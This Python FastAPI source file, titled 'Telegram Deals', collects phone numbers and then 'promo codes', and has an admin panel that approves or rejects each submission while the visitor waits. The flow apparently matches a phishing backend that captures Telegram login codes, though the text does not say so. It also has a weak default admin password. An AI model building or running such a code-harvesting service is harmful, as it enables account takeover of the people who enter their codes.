from pathlib import Path
import sqlite3
import os
import html



DB_PATH = os.getenv("DB_PATH", "contacts.db")


from fastapi import FastAPI, HTTPException, Depends
from fastapi.responses import FileResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from pydantic import BaseModel


BASE_DIR = Path(__file__).resolve().parent.parent
FRONTEND_DIR = BASE_DIR / "frontend"
DATABASE_PATH = BASE_DIR / "contacts.db"


app = FastAPI(title="Telegram Deals")

security = HTTPBasic()


# =========================
# НАСТРОЙКИ АДМИНКИ
# =========================

ADMIN_LOGIN = os.getenv("ADMIN_LOGIN", "admin")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")


# =========================
# ФОТОГРАФИИ
# =========================

app.mount(
    "/images",
    StaticFiles(directory=FRONTEND_DIR / "images"),
    name="images"
)


# =========================
# БАЗА ДАННЫХ
# =========================

def init_database():
    connection = sqlite3.connect(DB_PATH)

    connection.execute("""
        CREATE TABLE IF NOT EXISTS phone_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    """)

    # Добавляем новые поля к существующей базе.
    columns = {
        row[1]
        for row in connection.execute(
            "PRAGMA table_info(phone_submissions)"
        ).fetchall()
    }

    if "promo_code" not in columns:
        connection.execute(
            "ALTER TABLE phone_submissions ADD COLUMN promo_code TEXT"
        )

    if "status" not in columns:
        connection.execute(
            "ALTER TABLE phone_submissions ADD COLUMN status TEXT DEFAULT 'waiting'"
        )

    connection.commit()
    connection.close()


init_database()


# =========================
# МОДЕЛИ
# =========================

class PhoneRequest(BaseModel):
    phone: str


class PromoRequest(BaseModel):
    submission_id: int
    promo_code: str


# =========================
# ГЛАВНАЯ СТРАНИЦА
# =========================

@app.get("/")
def index():
    return FileResponse(FRONTEND_DIR / "index.html")


# =========================
# СОХРАНЕНИЕ НОМЕРА
# =========================

@app.post("/api/phone")
def save_phone(data: PhoneRequest):

    phone = data.phone.strip()

    if not phone:
        return {
            "success": False,
            "message": "Введите номер телефона"
        }

    if len(phone) < 7:
        return {
            "success": False,
            "message": "Проверьте номер телефона"
        }

    connection = sqlite3.connect(DATABASE_PATH)

    cursor = connection.execute(
        """
        INSERT INTO phone_submissions
        (phone, status)
        VALUES (?, 'waiting')
        """,
        (phone,)
    )

    submission_id = cursor.lastrowid

    connection.commit()
    connection.close()

    return {
        "success": True,
        "submission_id": submission_id
    }


# =========================
# СОХРАНЕНИЕ ПРОМОКОДА
# =========================

@app.post("/api/promo")
def save_promo(data: PromoRequest):

    promo = data.promo_code.strip()

    if not promo:
        return {
            "success": False,
            "message": "Введите промокод"
        }

    connection = sqlite3.connect(DATABASE_PATH)

    row = connection.execute(
        """
        SELECT id
        FROM phone_submissions
        WHERE id = ?
        """,
        (data.submission_id,)
    ).fetchone()

    if not row:
        connection.close()

        return {
            "success": False,
            "message": "Заявка не найдена"
        }

    connection.execute(
        """
        UPDATE phone_submissions
        SET promo_code = ?, status = 'waiting'
        WHERE id = ?
        """,
        (promo, data.submission_id)
    )

    connection.commit()
    connection.close()

    return {
        "success": True,
        "status": "waiting"
    }


# =========================
# ПРОВЕРКА СТАТУСА ЗАЯВКИ
# =========================

@app.get("/api/submission/{submission_id}")
def get_submission_status(submission_id: int):

    connection = sqlite3.connect(DATABASE_PATH)

    row = connection.execute(
        """
        SELECT status
        FROM phone_submissions
        WHERE id = ?
        """,
        (submission_id,)
    ).fetchone()

    connection.close()

    if not row:
        return {
            "success": False,
            "message": "Заявка не найдена"
        }

    return {
        "success": True,
        "status": row[0] or "waiting"
    }


# =========================
# ПРОВЕРКА АДМИНА
# =========================

def check_admin(credentials: HTTPBasicCredentials):

    if (
        credentials.username != ADMIN_LOGIN
        or credentials.password != ADMIN_PASSWORD
    ):
        raise HTTPException(
            status_code=401,
            detail="Неверный логин или пароль",
            headers={"WWW-Authenticate": "Basic"},
        )

    return True


# =========================
# ИЗМЕНЕНИЕ СТАТУСА
# =========================

@app.post("/api/admin/submission/{submission_id}/approve")
def approve_submission(
    submission_id: int,
    credentials: HTTPBasicCredentials = Depends(security)
):

    check_admin(credentials)

    connection = sqlite3.connect(DATABASE_PATH)

    cursor = connection.execute(
        """
        UPDATE phone_submissions
        SET status = 'approved'
        WHERE id = ?
        """,
        (submission_id,)
    )

    connection.commit()
    connection.close()

    if cursor.rowcount == 0:
        raise HTTPException(
            status_code=404,
            detail="Заявка не найдена"
        )

    return {
        "success": True,
        "status": "approved"
    }


@app.post("/api/admin/submission/{submission_id}/reject")
def reject_submission(
    submission_id: int,
    credentials: HTTPBasicCredentials = Depends(security)
):

    check_admin(credentials)

    connection = sqlite3.connect(DATABASE_PATH)

    cursor = connection.execute(
        """
        UPDATE phone_submissions
        SET status = 'rejected'
        WHERE id = ?
        """,
        (submission_id,)
    )

    connection.commit()
    connection.close()

    if cursor.rowcount == 0:
        raise HTTPException(
            status_code=404,
            detail="Заявка не найдена"
        )

    return {
        "success": True,
        "status": "rejected"
    }


# =========================
# АДМИНКА
# =========================

@app.get("/admin", response_class=HTMLResponse)
def admin(
    credentials: HTTPBasicCredentials = Depends(security)
):

    check_admin(credentials)

    connection = sqlite3.connect(DATABASE_PATH)

    rows = connection.execute(
        """
        SELECT id, phone, promo_code, status, created_at
        FROM phone_submissions
        ORDER BY id DESC
        """
    ).fetchall()

    connection.close()

    html_page = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>Админка</title>

    <style>

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 20px;

            font-family: Arial, sans-serif;

            background: #f4f4f4;
            color: #222;
        }

        .container {
            width: 100%;
            max-width: 1100px;

            margin: 0 auto;

            background: white;

            padding: 25px;

            border-radius: 16px;

            box-shadow:
                0 5px 25px rgba(0,0,0,0.08);
        }

        h1 {
            margin-top: 0;
        }

        .count {
            color: #666;
            margin-bottom: 20px;
        }

        .refresh {
            display: inline-block;

            padding: 10px 16px;

            margin-bottom: 20px;

            border: 0;
            border-radius: 10px;

            background: #6c63ff;
            color: white;

            cursor: pointer;

            font-weight: 700;
        }

        .table-wrapper {
            width: 100%;
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 800px;
        }

        th,
        td {
            padding: 12px;

            border-bottom:
                1px solid #eee;

            text-align: left;

            vertical-align: middle;
        }

        th {
            background: #f7f7f7;
        }

        .promo {
            font-weight: 700;
        }

        .waiting {
            color: #d88900;
            font-weight: 700;
        }

        .approved {
            color: #159447;
            font-weight: 700;
        }

        .rejected {
            color: #d93045;
            font-weight: 700;
        }

        .actions {
            display: flex;
            gap: 8px;
        }

        .actions button {
            border: 0;

            padding: 8px 12px;

            border-radius: 8px;

            color: white;

            cursor: pointer;

            font-weight: 700;
        }

        .approve {
            background: #159447;
        }

        .reject {
            background: #d93045;
        }

        .empty {
            padding: 30px 0;
            color: #777;
        }

        @media (max-width: 600px) {

            body {
                padding: 10px;
            }

            .container {
                padding: 15px;
            }

        }

    </style>
</head>

<body>

<div class="container">

    <h1>Админка</h1>

    <div class="count">
        Всего заявок: """ + str(len(rows)) + """
    </div>

    <button
        class="refresh"
        onclick="location.reload()"
    >
        🔄 Обновить
    </button>
"""

    if rows:

        html_page += """
    <div class="table-wrapper">

        <table>

            <thead>

                <tr>
                    <th>ID</th>
                    <th>Телефон</th>
                    <th>Промокод</th>
                    <th>Статус</th>
                    <th>Дата</th>
                    <th>Действие</th>
                </tr>

            </thead>

            <tbody>
"""

        for row in rows:

            submission_id = row[0]
            phone = html.escape(str(row[1]))
            promo = html.escape(str(row[2] or "—"))
            status = row[3] or "waiting"
            created_at = html.escape(str(row[4]))

            if status == "approved":
                status_text = "Одобрено"
                status_class = "approved"

            elif status == "rejected":
                status_text = "Отклонено"
                status_class = "rejected"

            else:
                status_text = "Ожидает"
                status_class = "waiting"

            html_page += f"""
                <tr>

                    <td>{submission_id}</td>

                    <td>{phone}</td>

                    <td class="promo">
                        {promo}
                    </td>

                    <td class="{status_class}">
                        {status_text}
                    </td>

                    <td>
                        {created_at}
                    </td>

                    <td>

                        <div class="actions">

                            <button
                                class="approve"
                                onclick="changeStatus({submission_id}, 'approve')"
                            >
                                Одобрить
                            </button>

                            <button
                                class="reject"
                                onclick="changeStatus({submission_id}, 'reject')"
                            >
                                Отклонить
                            </button>

                        </div>

                    </td>

                </tr>
"""

        html_page += """
            </tbody>

        </table>

    </div>
"""

    else:

        html_page += """
    <div class="empty">
        Пока нет заявок.
    </div>
"""

    html_page += """

</div>


<script>

async function changeStatus(id, action) {

    const response = await fetch(
        `/api/admin/submission/${id}/${action}`,
        {
            method: "POST"
        }
    );

    if (!response.ok) {

        alert("Не удалось изменить статус.");

        return;
    }

    location.reload();
}

</script>


</body>
</html>
"""

    return html_page


# =========================
# ПРОВЕРКА СЕРВЕРА
# =========================

@app.get("/api/health")
def health():
    return {
        "status": "ok"
    }